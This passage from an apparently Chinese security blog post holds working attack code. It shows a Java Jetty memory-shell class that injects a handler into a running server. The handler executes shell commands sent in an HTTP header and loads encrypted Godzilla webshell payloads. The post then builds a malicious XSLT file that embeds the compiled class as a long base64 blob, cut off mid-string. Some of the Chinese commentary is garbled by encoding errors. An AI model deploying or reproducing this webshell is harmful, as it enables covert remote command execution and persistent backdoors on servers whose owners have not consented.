class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> sun.misc.Unsafe <span class="hljs-title function_">getUnsafe</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, IllegalAccessException, NoSuchFieldException &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.misc.Unsafe&quot;</span>).getDeclaredField(<span class="hljs-string">&quot;theUnsafe&quot;</span>);<br>        unsafe.setAccessible(<span class="hljs-literal">true</span>);<br>        sun.misc.<span class="hljs-type">Unsafe</span> <span class="hljs-variable">theunsafe</span> <span class="hljs-operator">=</span> (sun.misc.Unsafe) unsafe.get(<span class="hljs-literal">null</span>);<br>        <span class="hljs-keyword">return</span> theunsafe;<br>    &#125;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> HttpConnection <span class="hljs-title function_">getValueField</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, ClassNotFoundException, IllegalAccessException &#123;<br>        <span class="hljs-type">Unsafe</span> <span class="hljs-variable">unsafe</span> <span class="hljs-operator">=</span> getUnsafe();<br>        <span class="hljs-type">ThreadGroup</span> <span class="hljs-variable">threadGroup</span> <span class="hljs-operator">=</span> Thread.currentThread().getThreadGroup();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">threadsfiled</span> <span class="hljs-operator">=</span> threadGroup.getClass().getDeclaredField(<span class="hljs-string">&quot;threads&quot;</span>);<br>        Thread[] threads = (Thread[]) unsafe.getObject(threadGroup, unsafe.objectFieldOffset(threadsfiled));<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;threads.length;i++) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">Field</span> <span class="hljs-variable">threadLocalsF</span> <span class="hljs-operator">=</span> threads[i].getClass().getDeclaredField(<span class="hljs-string">&quot;threadLocals&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">threadlocal</span> <span class="hljs-operator">=</span> unsafe.getObject(threads[i], unsafe.objectFieldOffset(threadLocalsF));<br>                Reference[] table = (Reference[]) unsafe.getObject(threadlocal, unsafe.objectFieldOffset(threadlocal.getClass().getDeclaredField(<span class="hljs-string">&quot;table&quot;</span>)));<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;table.length;j++)&#123;<br>                    <span class="hljs-keyword">try</span> &#123;<br>                        <span class="hljs-comment">//HttpConnection value = (HttpConnection) unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(&quot;value&quot;)));</span><br>                        <span class="hljs-comment">//PrintWriter writer = value.getHttpChannel().getResponse().getWriter();</span><br>                        <span class="hljs-comment">//writer.println(Runtime.getRuntime().exec(value.getHttpChannel().getRequest().getParameter(&quot;cmd&quot;)));</span><br>                        <span class="hljs-comment">//writer.flush();</span><br>                        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span>unsafe.getObject(table[j], unsafe.objectFieldOffset(table[j].getClass().getDeclaredField(<span class="hljs-string">&quot;value&quot;</span>)));<br>                        <span class="hljs-keyword">if</span>(value.getClass().getName().equals(<span class="hljs-string">&quot;org.eclipse.jetty.server.HttpConnection&quot;</span>))&#123;<br>                            <span class="hljs-keyword">return</span> (HttpConnection)value;<br>                        &#125;<br>                    &#125;<br>                    <span class="hljs-keyword">catch</span> (Exception e)&#123;<br><br>                    &#125;<br>                &#125;<br><br>            &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br><br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title function_">base64Encode</span><span class="hljs-params">(<span class="hljs-type">byte</span>[] bs)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">String</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getEncoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encodeToString&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Encoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">Encoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (String) Encoder.getClass().getMethod(<span class="hljs-string">&quot;encode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;<span class="hljs-type">byte</span>[].class&#125;).invoke(Encoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] base64Decode(String bs) <span class="hljs-keyword">throws</span> Exception &#123;<br>        Class base64;<br>        <span class="hljs-type">byte</span>[] value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            base64 = Class.forName(<span class="hljs-string">&quot;java.util.Base64&quot;</span>);<br>            <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.getMethod(<span class="hljs-string">&quot;getDecoder&quot;</span>, <span class="hljs-literal">null</span>).invoke(base64, <span class="hljs-literal">null</span>);<br>            value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decode&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                base64 = Class.forName(<span class="hljs-string">&quot;sun.misc.BASE64Decoder&quot;</span>);<br>                <span class="hljs-type">Object</span> <span class="hljs-variable">decoder</span> <span class="hljs-operator">=</span> base64.newInstance();<br>                value = (<span class="hljs-type">byte</span>[]) decoder.getClass().getMethod(<span class="hljs-string">&quot;decodeBuffer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).invoke(decoder, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;bs&#125;);<br>            &#125; <span class="hljs-keyword">catch</span> (Exception e2) &#123;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> value;<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] x(<span class="hljs-type">byte</span>[] s, <span class="hljs-type">boolean</span> m) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">Cipher</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Cipher.getInstance(<span class="hljs-string">&quot;AES&quot;</span>);<br>            c.init(m ? <span class="hljs-number">1</span> : <span class="hljs-number">2</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">SecretKeySpec</span>(xc.getBytes(), <span class="hljs-string">&quot;AES&quot;</span>));<br>            <span class="hljs-keyword">return</span> c.doFinal(s);<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(String s, Request base, HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException, ServletException &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;cmd&quot;</span>)) &#123;<br>                <span class="hljs-type">String</span> <span class="hljs-variable">cmd</span> <span class="hljs-operator">=</span> request.getHeader(<span class="hljs-string">&quot;cmd&quot;</span>);<br>                <span class="hljs-keyword">if</span> (cmd != <span class="hljs-literal">null</span> &amp;&amp; !cmd.isEmpty()) &#123;<br>                    String[] cmds = <span class="hljs-literal">null</span>;<br>                    <span class="hljs-keyword">if</span> (System.getProperty(<span class="hljs-string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="hljs-string">&quot;win&quot;</span>)) &#123;<br>                        cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;cmd&quot;</span>, <span class="hljs-string">&quot;/c&quot;</span>, cmd&#125;;<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        cmds = <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[]&#123;<span class="hljs-string">&quot;/bin/bash&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, cmd&#125;;<br>                    &#125;<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">result</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scanner</span>(Runtime.getRuntime().exec(cmds).getInputStream()).useDelimiter(<span class="hljs-string">&quot;\\ASADSADASDSADAS&quot;</span>).next();<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(result.getBytes());<br>                    outputStream.flush();<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (request.getHeader(<span class="hljs-string">&quot;x-fuck-data&quot;</span>).equalsIgnoreCase(<span class="hljs-string">&quot;godzilla&quot;</span>)) &#123;<br>                <span class="hljs-comment">// å“¥æ–¯æ‹‰æ˜¯é€šè¿‡ localhost/?pass=payload ä¼ å‚ ä¸å­˜åœ¨åŒ…è£…ç±»é—®é¢˜</span><br>                <span class="hljs-type">byte</span>[] data = base64Decode(request.getParameter(pass));<br>                data = x(data, <span class="hljs-literal">false</span>);<br>                <span class="hljs-keyword">if</span> (payload == <span class="hljs-literal">null</span>) &#123;<br>                    <span class="hljs-type">URLClassLoader</span> <span class="hljs-variable">urlClassLoader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URLClassLoader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>[<span class="hljs-number">0</span>], Thread.currentThread().getContextClassLoader());<br>                    <span class="hljs-type">Method</span> <span class="hljs-variable">defMethod</span> <span class="hljs-operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="hljs-string">&quot;defineClass&quot;</span>, <span class="hljs-type">byte</span>[].class, <span class="hljs-type">int</span>.class, <span class="hljs-type">int</span>.class);<br>                    defMethod.setAccessible(<span class="hljs-literal">true</span>);<br>                    payload = (Class) defMethod.invoke(urlClassLoader, data, <span class="hljs-number">0</span>, data.length);<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    java.io.<span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">arrOut</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.ByteArrayOutputStream();<br>                    <span class="hljs-type">Object</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span> payload.newInstance();<br>                    f.equals(arrOut);<br>                    f.equals(data);<br>                    f.equals(request);<br>                    base.setHandled(<span class="hljs-literal">true</span>);<br>                    <span class="hljs-type">ServletOutputStream</span> <span class="hljs-variable">outputStream</span> <span class="hljs-operator">=</span> response.getOutputStream();<br>                    outputStream.write(md5.substring(<span class="hljs-number">0</span>, <span class="hljs-number">16</span>).getBytes());<br>                    f.toString();<br>                    outputStream.write(base64Encode(x(arrOut.toByteArray(), <span class="hljs-literal">true</span>)).getBytes());<br>                    outputStream.write(md5.substring(<span class="hljs-number">16</span>).getBytes());<br>                    outputStream.flush();<br>                    <span class="hljs-keyword">return</span> ;<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç„¶åç¼–è¯‘ä¸€ä¸‹è½¬æˆbase64æ”¾åˆ°xsltæ–‡ä»¶é‡Œé¢å»ï¼Œæœ€ç»ˆçš„æ¶æ„xsltå¦‚ä¸‹</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:stylesheet</span> <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;1.0&quot;</span> <span class="hljs-attr">xmlns:xsl</span>=<span class="hljs-string">&quot;http://www.w3.org/1999/XSL/Transform&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:b64</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/sun.misc.BASE64Decoder&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ob</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Object&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:th</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/java.lang.Thread&quot;</span></span><br><span class="hljs-tag">                <span class="hljs-attr">xmlns:ru</span>=<span class="hljs-string">&quot;http://xml.apache.org/xalan/java/org.springframework.cglib.core.ReflectUtils&quot;</span></span><br><span class="hljs-tag">&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">xsl:template</span> <span class="hljs-attr">match</span>=<span class="hljs-string">&quot;/&quot;</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;bs&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;b64:decodeBuffer(b64:new(),&#x27;yv66vgAAADMCAAgA+QoA+gD7CgA4APwKADgA/QoA+gD+BwD/CgD6AQAKAAYBAQoABgECCgA4AQMHAQQKAIgBBQgBBgkAgAEHCAEICQCAAQkHAQoKABEBBQoAEQELCgARAQwKAIABDQkAgAEOCQEPARAKAREBEggBEwoANQEUCAEVCgA1ARYKARcBGAoBFwEZBwEaCgCAARsKARwBHQoBHAEeCgA3AR8IALQKAB8BIAoAHwEhBwC1CAEiCACuBwCvCACpCgA1ASMIASQKADgBJQcBJggBJwgBKAoANQEpCgEqASsIASwHAS0HAMEHAS4HAS8IATAKADUBMQgBMggBMwgBNAgBNQgBNggBNwoBOAE5BwE6CgBCATsKATgBPAoBOAE9CAE+CwE/AUAIANMKADgBQQoAOAFCCAFDCgEPAUQKADgBRQgBRgoAOAFHCAFICAFJCAFKCgFLAUwHAU0KAU4BTwoBTgFQCgFRAVIKAFQBUwgBVAoAVAFVCgBUAVYLAVcBWAoBWQFaCgFZAVsIAVwLAT8BXQoAgAFeCgCAAV8JAIABYAcBYQcBYgoBHAFjCgBkAWQHAWUIAWYJAWcBaAoANQFpCgEqARgKAWcBagcBawoAbgEFCgA3ASUKADgBbAoANwEMCgBuAW0KAIABbgoAOAFvCgCAAXAKAC8BcQoBcgFzCgF0AXUHAXYIAXcKAXgBeQoBFwF6CgB6AXsHAXwHAX0KAIABfgoAegF/BwGABwGBCgCEAYIHAYMHAYQHAYUBAAJ4YwEAEkxqYXZhL2xhbmcvU3RyaW5nOwEABHBhc3MBAANtZDUBAAdwYXlsb2FkAQARTGphdmEvbGFuZy9DbGFzczsBACYoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nOwEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFtAQAdTGphdmEvc2VjdXJpdHkvTWVzc2FnZURpZ2VzdDsBAAFzAQADcmV0AQANU3RhY2tNYXBUYWJsZQcBLwcBBAEABjxpbml0PgEAAygpVgEABHRoaXMBAChMY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGw7AQAEKEkpVgEAAUkBAAlnZXRVbnNhZmUBABMoKUxzdW4vbWlzYy9VbnNhZmU7AQAGdW5zYWZlAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEACXRoZXVuc2FmZQEAEUxzdW4vbWlzYy9VbnNhZmU7AQAKRXhjZXB0aW9ucwEADWdldFZhbHVlRmllbGQBACsoKUxvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvSHR0cENvbm5lY3Rpb247AQAFdmFsdWUBABJMamF2YS9sYW5nL09iamVjdDsBAAFqAQANdGhyZWFkTG9jYWxzRgEAC3RocmVhZGxvY2FsAQAFdGFibGUBABpbTGphdmEvbGFuZy9yZWYvUmVmZXJlbmNlOwEAAWkBAAt0aHJlYWRHcm91cAEAF0xqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAMdGhyZWFkc2ZpbGVkAQAHdGhyZWFkcwEAE1tMamF2YS9sYW5nL1RocmVhZDsHARoHAYYHAYcHAS4BAAxiYXNlNjRFbmNvZGUBABYoW0IpTGphdmEvbGFuZy9TdHJpbmc7AQAHRW5jb2RlcgEABmJhc2U2NAEAAWUBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAJicwEAAltCAQAMYmFzZTY0RGVjb2RlAQAWKExqYXZhL2xhbmcvU3RyaW5nOylbQgEAB2RlY29kZXIBAAF4AQAHKFtCWilbQgEAAWMBABVMamF2YXgvY3J5cHRvL0NpcGhlcjsBAAFaBwF9BwGIAQAGaGFuZGxlAQCGKExqYXZhL2xhbmcvU3RyaW5nO0xvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7KVYBAARjbWRzAQATW0xqYXZhL2xhbmcvU3RyaW5nOwEABnJlc3VsdAEADG91dHB1dFN0cmVhbQEAI0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW07AQADY21kAQAOdXJsQ2xhc3NMb2FkZXIBABlMamF2YS9uZXQvVVJMQ2xhc3NMb2FkZXI7AQAJZGVmTWV0aG9kAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBAAZhcnJPdXQBAB9MamF2YS9pby9CeXRlQXJyYXlPdXRwdXRTdHJlYW07AQABZgEABGRhdGEBAARiYXNlAQAiTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9SZXF1ZXN0OwEAB3JlcXVlc3QBACdMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVxdWVzdDsBAAhyZXNwb25zZQEAKExqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsHAM8HAYkHAYoBAAg8Y2xpbml0PgEACnZhbHVlRmllbGQBAClMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL0h0dHBDb25uZWN0aW9uOwEAB2hhbmRsZXIBADRMb3JnL2VjbGlwc2UvamV0dHkvc2VydmVyL2hhbmRsZXIvSGFuZGxlckNvbGxlY3Rpb247AQASbXV0YWJsZVdoZW5SdW5uaW5nAQAIaGFuZGxlcnMBACNbTG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyOwEAC25ld0hhbmRsZXJzAQAgTGphdmEvbGFuZy9Ob1N1Y2hGaWVsZEV4Y2VwdGlvbjsBACJMamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb247AQAiTGphdmEvbGFuZy9JbGxlZ2FsQWNjZXNzRXhjZXB0aW9uOwcBJgcBdgcA7AcBgAcBgwcBhAEAClNvdXJjZUZpbGUBABpKZXR0eUdvZHppbGxhTWVtc2hlbGwuamF2YQEAA01ENQcBiwwBjAGNDAGOAY8MAZABkQwBkgGTAQAUamF2YS9tYXRoL0JpZ0ludGVnZXIMAZQBjwwAmgGVDAGWAZcMAZgBmQEAE2phdmEvbGFuZy9FeGNlcHRpb24MAJoAmwEAEDNjNmUwYjhhOWMxNTIyNGEMAIkAigEACHVzZXJuYW1lDACLAIoBABdqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcgwBmgGbDAGWAZkMAIwAjwwAjACKBwGcDAGdAZ4HAZ8MAaAAngEAD3N1bi5taXNjLlVuc2FmZQwBoQGiAQAJdGhlVW5zYWZlDAGjAaQHAYcMAaUBpgwBpwGoAQAPc3VuL21pc2MvVW5zYWZlDACgAKEHAakMAaoBqwwBrAGtDAGuAa8MAbABsQwBsgGzAQAMdGhyZWFkTG9jYWxzDAG0AZkBACdvcmcuZWNsaXBzZS5qZXR0eS5zZXJ2ZXIuSHR0cENvbm5lY3Rpb24MAbUBtgEAJ29yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IdHRwQ29ubmVjdGlvbgEAEGphdmEudXRpbC5CYXNlNjQBAApnZXRFbmNvZGVyDAG3AbgHAbkMAboBuwEADmVuY29kZVRvU3RyaW5nAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL09iamVjdAEAEGphdmEvbGFuZy9TdHJpbmcBABZzdW4ubWlzYy5CQVNFNjRFbmNvZGVyDAG8Ab0BAAZlbmNvZGUBAApnZXREZWNvZGVyAQAGZGVjb2RlAQAWc3VuLm1pc2MuQkFTRTY0RGVjb2RlcgEADGRlY29kZUJ1ZmZlcgEAA0FFUwcBiAwBjAG+AQAfamF2YXgvY3J5cHRvL3NwZWMvU2VjcmV0S2V5U3BlYwwAmgG/DAHAAcEMAcIBwwEAC3gtZnVjay1kYXRhBwHEDAHFAI8MAcYBxwwByAHJAQAHb3MubmFtZQwBygCPDAHLAZkBAAN3aW4MAcwBzQEAAi9jAQAJL2Jpbi9iYXNoAQACLWMHAc4MAc8BpgEAEWphdmEvdXRpbC9TY2FubmVyBwHQDAHRAdIMAdMB1AcB1QwB1gHXDACaAdgBABBcQVNBRFNBREFTRFNBREFTDAHZAdoMAdsBmQcB3AwB3QHeBwHfDAHgAeEMAeIAmwEACGdvZHppbGxhDAHjAI8MAMIAwwwAxQDGDACNAI4BABdqYXZhL25ldC9VUkxDbGFzc0xvYWRlcgEADGphdmEvbmV0L1VSTAwB5AHlDACaAeYBABVqYXZhL2xhbmcvQ2xhc3NMb2FkZXIBAAtkZWZpbmVDbGFzcwcB5wwB6ACODAHpAbgMAeoB6wEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFtDAHsAe0MAe4BjwwAugC7DAHsAZcMAKcAqAwB7wHwBwHxDAHyAfMHAfQMAfUB9gEAMm9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9oYW5kbGVyL0hhbmRsZXJDb2xsZWN0aW9uAQATX211dGFibGVXaGVuUnVubmluZwcB9wwB6gH4DAH5AfoMAfsB/AEAIG9yZy9lY2xpcHNlL2pldHR5L3NlcnZlci9IYW5kbGVyAQAmY29tL3h4bC9qb2IvY29yZS9KZXR0eUdvZHppbGxhTWVtc2hlbGwMAJoAngwB/QH+AQAeamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uAQAaamF2YS9sYW5nL1J1bnRpbWVFeGNlcHRpb24MAJoB/wEAIGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uAQAgamF2YS9sYW5nL0lsbGVnYWxBY2Nlc3NFeGNlcHRpb24BADBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvaGFuZGxlci9BYnN0cmFjdEhhbmRsZXIBABVqYXZhL2xhbmcvVGhyZWFkR3JvdXABABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAE2phdmF4L2NyeXB0by9DaXBoZXIBABNqYXZhL2lvL0lPRXhjZXB0aW9uAQAeamF2YXgvc2VydmxldC9TZXJ2bGV0RXhjZXB0aW9uAQAbamF2YS9zZWN1cml0eS9NZXNzYWdlRGlnZXN0AQALZ2V0SW5zdGFuY2UBADEoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL3NlY3VyaXR5L01lc3NhZ2VEaWdlc3Q7AQAIZ2V0Qnl0ZXMBAAQoKVtCAQAGbGVuZ3RoAQADKClJAQAGdXBkYXRlAQAHKFtCSUkpVgEABmRpZ2VzdAEABihJW0IpVgEACHRvU3RyaW5nAQAVKEkpTGphdmEvbGFuZy9TdHJpbmc7AQALdG9VcHBlckNhc2UBABQoKUxqYXZhL2xhbmcvU3RyaW5nOwEABmFwcGVuZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmdCdWlsZGVyOwEAEGphdmEvbGFuZy9TeXN0ZW0BAANvdXQBABVMamF2YS9pby9QcmludFN0cmVhbTsBABNqYXZhL2lvL1ByaW50U3RyZWFtAQAHcHJpbnRsbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQAQZ2V0RGVjbGFyZWRGaWVsZAEALShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAOZ2V0VGhyZWFkR3JvdXABABkoKUxqYXZhL2xhbmcvVGhyZWFkR3JvdXA7AQAIZ2V0Q2xhc3MBABMoKUxqYXZhL2xhbmcvQ2xhc3M7AQARb2JqZWN0RmllbGRPZmZzZXQBABwoTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOylKAQAJZ2V0T2JqZWN0AQAnKExqYXZhL2xhbmcvT2JqZWN0O0opTGphdmEvbGFuZy9PYmplY3Q7AQAHZ2V0TmFtZQEABmVxdWFscwEAFShMamF2YS9sYW5nL09iamVjdDspWgEACWdldE1ldGhvZAEAQChMamF2YS9sYW5nL1N0cmluZztbTGphdmEvbGFuZy9DbGFzczspTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABhqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2QBAAZpbnZva2UBADkoTGphdmEvbGFuZy9PYmplY3Q7W0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAAtuZXdJbnN0YW5jZQEAFCgpTGphdmEvbGFuZy9PYmplY3Q7AQApKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YXgvY3J5cHRvL0NpcGhlcjsBABcoW0JMamF2YS9sYW5nL1N0cmluZzspVgEABGluaXQBABcoSUxqYXZhL3NlY3VyaXR5L0tleTspVgEAB2RvRmluYWwBAAYoW0IpW0IBACVqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0AQAJZ2V0SGVhZGVyAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEAB2lzRW1wdHkBAAMoKVoBAAtnZXRQcm9wZXJ0eQEAC3RvTG93ZXJDYXNlAQAIY29udGFpbnMBABsoTGphdmEvbGFuZy9DaGFyU2VxdWVuY2U7KVoBACBvcmcvZWNsaXBzZS9qZXR0eS9zZXJ2ZXIvUmVxdWVzdAEACnNldEhhbmRsZWQBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAoKFtMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9Qcm9jZXNzOwEAEWphdmEvbGFuZy9Qcm9jZXNzAQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEADHVzZURlbGltaXRlcgEAJyhMamF2YS9sYW5nL1N0cmluZzspTGphdmEvdXRpbC9TY2FubmVyOwEABG5leHQBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEAD2dldE91dHB1dFN0cmVhbQEAJSgpTGphdmF4L3NlcnZsZXQvU2VydmxldE91dHB1dFN0cmVhbTsBACFqYXZheC9zZXJ2bGV0L1NlcnZsZXRPdXRwdXRTdHJlYW0BAAV3cml0ZQEABShbQilWAQAFZmx1c2gBAAxnZXRQYXJhbWV0ZXIBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBABkoKUxqYXZhL2xhbmcvQ2xhc3NMb2FkZXI7